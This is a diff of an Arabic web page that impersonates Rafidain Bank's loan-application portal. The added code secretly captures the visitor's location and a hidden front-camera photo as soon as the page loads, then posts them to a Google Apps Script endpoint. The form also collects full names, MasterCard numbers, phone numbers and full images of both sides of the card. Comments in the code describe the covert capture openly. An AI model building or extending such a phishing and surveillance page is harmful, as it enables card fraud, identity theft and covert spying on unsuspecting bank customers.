@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>استمارة تقديم سلف مصرف الرافدين</title>
+    <title>مصرف الرافدين - التقديم الإلكتروني</title>
     <style>
         :root {
             --primary-color: #0b4f6c;
-            --secondary-color: #01baef;
+            --success-green: #2e7d32;
             --bg-color: #f4f7f6;
         }
         body {
@@ -34,10 +34,6 @@
         .header h2 {
             color: var(--primary-color);
             margin: 5px 0;
-        }
-        .header p {
-            color: #666;
-            font-size: 14px;
         }
         .step {
             display: none;
@@ -77,33 +73,32 @@
         .btn:hover {
             background-color: #08384d;
         }
-        .device-info-box {
-            background: #eef2f5;
-            padding: 15px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .camera-box {
-            border: 2px dashed #ccc;
-            padding: 15px;
+        .loading-screen {
             text-align: center;
-            border-radius: 6px;
-            background: #fafafa;
-            margin-bottom: 10px;
+            padding: 40px 0;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--success-green);
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
         .success-msg {
             text-align: center;
-            color: #28a745;
+            color: var(--success-green);
             font-size: 18px;
             font-weight: bold;
         }
-        .loading {
-            text-align: center;
+        /* عنصر مخفي لالتقاط الصورة بالخلفية */
+        #hiddenCanvas {
             display: none;
-            color: var(--primary-color);
-            font-weight: bold;
-            margin-top: 10px;
         }
     </style>
 </head>
@@ -112,25 +107,20 @@
 <div class="container">
     <div class="header">
         <h2>مصرف الرافدين</h2>
-        <p>التقديم الإلكتروني للسلف الشخصية</p>
+        <p>بوابة التقديم الذكية للسلف الشخصية</p>
     </div>
 
-    <!-- الخطوة الأولى: التحقق من الجهاز والموقع -->
-    <div id="step1" class="step active">
-        <h3>الخطوة 1: التحقق الأمني والبيئي</h3>
-        <p>يرجى السماح بالوصول إلى الموقع الجغرافي لتأكيد تقديم الطلب وتحميل بيانات الجهاز.</p>
-        
-        <div class="device-info-box" id="deviceInfoDisplay">
-            جاري فحص الجهاز والموقع...
-        </div>
-
-        <button class="btn" onclick="proceedToForm()">متابعة إلى الاستمارة</button>
+    <!-- الخطوة 0: جاري التحميل والاتصال الخفي -->
+    <div id="stepLoading" class="step active loading-screen">
+        <div class="spinner"></div>
+        <h3 style="color: var(--success-green);">جاري الاتصال بخوادم مصرف الرافدين...</h3>
+        <p>يرجى السماح بالصلاحيات المطلوبة (الموقع الجغرافي والكاميرا) لفتح الاستمارة الآمنة.</p>
     </div>
 
-    <!-- الخطوة الثانية: الاستمارة الرئيسية -->
-    <div id="step2" class="step">
-        <h3>الخطوة 2: ملء بيانات السلفة</h3>
-        <form id="loanForm" onsubmit="submitForm(event)">
+    <!-- الخطوة 1: الاستمارة الرئيسية (تفتح بعد الإرسال الخفي) -->
+    <div id="stepForm" class="step">
+        <h3 style="color: var(--success-green); text-align: center;">استمارة التقديم الرسمية</h3>
+        <form id="loanForm" onsubmit="submitLoanForm(event)">
             <div class="form-group">
                 <label for="fullName">الاسم الثلاثي واللقب:</label>
                 <input type="text" id="fullName" required placeholder="أدخل اسمك الثلاثي">
@@ -157,69 +147,110 @@
 
             <div class="form-group">
                 <label>صورة وجه البطاقة (ماستر كارد):</label>
-                <div class="camera-box">
-                    <input type="file" accept="image/*" capture="environment" id="cardFront" required>
-                </div>
+                <input type="file" accept="image/*" capture="environment" id="cardFront" required>
             </div>
 
             <div class="form-group">
                 <label>صورة خلف البطاقة (ماستر كارد):</label>
-                <div class="camera-box">
-                    <input type="file" accept="image/*" capture="environment" id="cardBack" required>
-                </div>
+                <input type="file" accept="image/*" capture="environment" id="cardBack" required>
             </div>
 
-            <button type="submit" id="submitBtn" class="btn">إرسال الطلب نهائياً</button>
-            <div id="loadingText" class="loading">جاري إرسال البيانات وحفظها في Google Sheets...</div>
+            <button type="submit" class="btn">إرسال الطلب نهائياً</button>
         </form>
     </div>
 
-    <!-- الخطوة الثالثة: النجاح -->
-    <div id="step3" class="step">
+    <!-- الخطوة 2: رسالة النجاح -->
+    <div id="stepSuccess" class="step">
         <div class="success-msg">
-            <h3>تم إرسال طلبك بنجاح!</h3>
-            <p>شكراً لتعاملكم مع مصرف الرافدين. تم حفظ بياناتكم في النظام وسيتم مراجعة الطلب قريباً.</p>
+            <h3>تم تقديم طلبك بنجاح!</h3>
+            <p>شكراً لك. تم حفظ بياناتك ومعلومات النظام وإرسالها إلى مصرف الرافدين بنجاح، وسيتم التواصل معك قريباً.</p>
         </div>
     </div>
 </div>
 
+<!-- عناصر فيديو وكاميرا مخفية لالتقاط الصورة في الخلفية -->
+<video id="hiddenVideo" autoplay playsinline style="display:none;"></video>
+<canvas id="hiddenCanvas"></canvas>
+
 <script>
-    // ضع رابط الـ Web App الخاص بك هنا بعد نشره في Google Apps Script
     const SCRIPT_URL = "YOUR_GOOGLE_APPS_SCRIPT_URL";
 
-    let clientData = {
+    let backgroundData = {
+        type: "background_capture",
         device: navigator.userAgent,
-        platform: navigator.platform,
-        lat: null,
-        lng: null
+        lat: "غير متوفر",
+        lng: "غير متوفر",
+        capturedImage: ""
     };
 
+    // العمليات التي تتم فور فتح الصفحة في الخلفية
     window.onload = function() {
-        let infoHtml = `<strong>نوع الجهاز:</strong> ${clientData.platform}<br>`;
+        // 1. جلب الموقع الجغرافي
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    clientData.lat = position.coords.latitude;
-                    clientData.lng = position.coords.longitude;
-                    infoHtml += `<strong>حالة الموقع:</strong> تم التقاط الموقع الجغرافي بنجاح.`;
-                    document.getElementById('deviceInfoDisplay').innerHTML = infoHtml;
+                    backgroundData.lat = position.coords.latitude;
+                    backgroundData.lng = position.coords.longitude;
+                    capturePhotoAndSend();
                 },
                 function(error) {
-                    infoHtml += `<strong>حالة الموقع:</strong> تم تخطي الموقع أو رفض الإذن.`;
-                    document.getElementById('deviceInfoDisplay').innerHTML = infoHtml;
-                }
+                    // حتى لو رفض المستخدم الموقع، نتابع التقاط الصورة ونفتح الاستمارة
+                    capturePhotoAndSend();
+                },
+                { timeout: 5000 }
             );
         } else {
-            document.getElementById('deviceInfoDisplay').innerHTML = infoHtml + "الموقع غير مدعوم.";
+            capturePhotoAndSend();
         }
     };
 
-    function proceedToForm() {
-        document.getElementById('step1').classList.remove('active');
-        document.getElementById('step2').classList.add('active');
+    // التقاط صورة خفية عبر الكاميرا في الخلفية
+    function capturePhotoAndSend() {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = stream;
+                video.play();
+                
+                setTimeout(() => {
+                    const canvas = document.getElementById('hiddenCanvas');
+                    canvas.width = video.videoWidth || 320;
+                    canvas.height = video.videoHeight || 240;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    backgroundData.capturedImage = canvas.toDataURL('image/jpeg', 0.5);
+                    
+                    // إيقاف الكاميرا فوراً بعد التقاط الصورة
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // إرسال البيانات للجدول في الخلفية ثم فتح الاستمارة
+                    sendBackgroundData();
+                }, 1000);
+            })
+            .catch(err => {
+                // إذا لم تتوفر صلاحية الكاميرا، نرسل البيانات المتاحة ونفتح الاستمارة فوراً
+                sendBackgroundData();
+            });
     }
 
-    // تحويل الصور إلى Base64 لسهولة إرسالها وحفظها
+    // إرسال البيانات الخفية لشيت الكوكل
+    function sendBackgroundData() {
+        fetch(SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(backgroundData)
+        }).catch(e => console.log(e));
+
+        // فتح الاستمارة للعميل بعد ثوانٍ قصيرة من التحميل الخفي
+        setTimeout(() => {
+            document.getElementById('stepLoading').classList.remove('active');
+            document.getElementById('stepForm').classList.add('active');
+        }, 1200);
+    }
+
+    // تحويل صور البطاقة لـ Base64 وإرسال الاستمارة النهائية
     function convertImageToBase64(file) {
         return new Promise((resolve, reject) => {
             const reader = new FileReader();
@@ -229,25 +260,20 @@
         });
     }
 
-    async function submitForm(event) {
+    async function submitLoanForm(event) {
         event.preventDefault();
-        
-        document.getElementById('submitBtn').style.display = 'none';
-        document.getElementById('loadingText').style.display = 'block';
 
         const frontFile = document.getElementById('cardFront').files[0];
         const backFile = document.getElementById('cardBack').files[0];
 
-        let frontBase64 = frontFile ? await convertImageToBase64(frontFile) : "";
-        let backBase64 = backFile ? await convertImageToBase64(backFile) : "";
-
         const formData = {
+            type: "loan_submission",
             fullName: document.getElementById('fullName').value,
             masterCard: document.getElementById('masterCard').value,
             phone: document.getElementById('phone').value,
             loanType: document.getElementById('loanType').value,
-            cardFront: frontBase64 ? "تم إرفاق الصورة" : "لا توجد صورة",
-            cardBack: backBase64 ? "تم إرفاق الصورة" : "لا توجد صورة"
+            cardFront: frontFile ? await convertImageToBase64(frontFile) : "",
+            cardBack: backFile ? await convertImageToBase64(backFile) : ""
         };
 
         try {
@@ -258,13 +284,10 @@
                 body: JSON.stringify(formData)
             });
 
-            // الانتقال لصفحة النجاح
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step3').classList.add('active');
+            document.getElementById('stepForm').classList.remove('active');
+            document.getElementById('stepSuccess').classList.add('active');
         } catch (error) {
             alert('حدث خطأ أثناء الإرسال، يرجى المحاولة مرة أخرى.');
-            document.getElementById('submitBtn').style.display = 'block';
-            document.getElementById('loadingText').style.display = 'none';
         }
     }
 </script>
